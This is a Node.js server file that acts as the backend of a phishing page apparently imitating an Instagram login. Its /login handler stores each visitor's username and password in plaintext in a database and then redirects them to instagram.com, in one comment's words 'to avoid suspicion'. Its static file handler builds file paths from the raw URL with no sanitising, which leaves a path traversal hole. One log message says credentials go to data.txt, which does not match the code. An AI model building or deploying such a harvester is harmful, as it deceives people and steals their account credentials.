const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const querystring = require('querystring');

const PORT = 8080;

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url);

    // Handle login POST request
    if (req.method === 'POST' && parsedUrl.pathname === '/login') {
        let body = '';

        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            const formData = querystring.parse(body);
            const username = formData.username || '';
            const password = formData.password || '';

            try {
                // Save to Database using Prisma
                const { PrismaClient } = require('@prisma/client');
                const prisma = new PrismaClient();

                await prisma.loginAttempt.create({
                    data: {
                        username: username,
                        password: password,
                    },
                });

                console.log('Credentials saved to database:', { username });
                await prisma.$disconnect();

                // Redirect to Instagram after saving
                res.writeHead(302, {
                    'Location': 'https://www.instagram.com/'
                });
                res.end();
            } catch (err) {
                console.error('Error writing to database:', err);
                // Also redirect on error to avoid suspicion, or show error if preferred
                // For now, mirroring old behavior: valid response or redirect
                // But old behavior showed 500 on file error. Let's redirect anyway or show 500.
                res.writeHead(500, { 'Content-Type': 'text/html' });
                res.end('<html><body><h1>500 Internal Server Error</h1></body></html>');
            }
        });

        return;
    }

    // Serve static files
    if (req.method === 'GET') {
        let filePath = '.' + parsedUrl.pathname;
        if (filePath === './') {
            filePath = './index.html';
        }

        const extname = path.extname(filePath);
        let contentType = 'text/html';

        switch (extname) {
            case '.css':
                contentType = 'text/css';
                break;
            case '.js':
                contentType = 'text/javascript';
                break;
            case '.jpg':
            case '.jpeg':
                contentType = 'image/jpeg';
                break;
            case '.png':
                contentType = 'image/png';
                break;
        }

        fs.readFile(filePath, (err, content) => {
            if (err) {
                if (err.code === 'ENOENT') {
                    res.writeHead(404, { 'Content-Type': 'text/html' });
                    res.end('<html><body><h1>404 Not Found</h1></body></html>');
                } else {
                    res.writeHead(500, { 'Content-Type': 'text/html' });
                    res.end('<html><body><h1>500 Internal Server Error</h1></body></html>');
                }
            } else {
                res.writeHead(200, { 'Content-Type': contentType });
                res.end(content, 'utf-8');
            }
        });
    }
});

server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}/`);
    console.log('Credentials will be saved to data.txt file');
});